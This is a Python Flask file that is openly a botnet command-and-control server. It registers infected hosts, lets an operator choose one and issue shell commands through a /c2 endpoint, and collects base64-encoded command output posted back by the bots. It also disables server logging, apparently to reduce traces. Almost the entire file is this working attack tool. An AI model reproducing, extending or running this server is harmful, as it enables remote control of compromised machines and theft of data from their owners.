from flask import Flask, redirect, request
import json
import threading
import logging
import base64
import sys


app = Flask(__name__)
'''
'''
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True

botHandler = ''
cmd = 'whoami'
bots = []
cmd_version = 0

@app.route('/')
def index():
    return "200"

@app.route('/welcome', methods=['GET', 'POST'])
def welcome():
    if request.method == 'POST':
        try:
            data = request.get_json()
            botname = data.get('botname').replace('\n', '')
            botname = botname.replace('\r', '')
            if botname not in bots:
                bots.append(botname)
                print(f'\n[+] We have a New Family Member, say hello to {botname}')
        except:
            botname = request.form['botname']
            if botname not in bots:
                bots.append(botname)
                print(f'\n[+] We have a New Family Member, say hello to {botname}')
    return "The Family is getting bigger!!! (^_^)"

@app.route('/bye', methods=['GET', 'POST'])
def bye():
    if request.method == 'POST':
        botname = request.form['botname']
        if botname not in bots:
            bots.remove(botname)
    return "We will miss you... (°_°)"


@app.route('/c2', methods=['POST', 'GET'])
def c2():
    if request.method == 'POST':
        try:
            data = request.get_json()
            res = base64.b64decode(data.get('result'))
            bot = data.get('bot')
            print(f'\n[{bot}] Has something for you...')
            print(res.decode('utf-8'))
        except:
            res = base64.b64decode(request.form['result'])
            bot = request.form['bot']
            print(f'\n[{bot}] Has something for you...')
            print(res.decode('utf-8'))
        return redirect('/')
    else:
        user = request.args.get('nm')
        return json.dumps({
            "bot": botHandler,
            "cmd": cmd,
            "rev": f"{cmd_version}"
        })


# main driver function
if __name__ == '__main__':

    print('Welcome to the master of botnets via HTTP...')

    thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=9090)).start()

    while KeyboardInterrupt:
        if botHandler == '':
            botList = [f'[{n}] {bots[n]}\n' for n in range(len(bots))]
            print(''.join(botList))
            botChoosed = input('Choose a bot: ')
            try:
                if botChoosed in bots:
                    botHandler = botChoosed
                elif int(botChoosed) in range(len(bots)):
                    botHandler = bots[int(botChoosed)]
            except ValueError:
                pass

        else:
            cmd = input(f'{botHandler}> ')
            if cmd == 'quit':
                botHandler = ''
            else:
                cmd_version += 1
    stop_thread = True
    thread.join()
    sys.exit()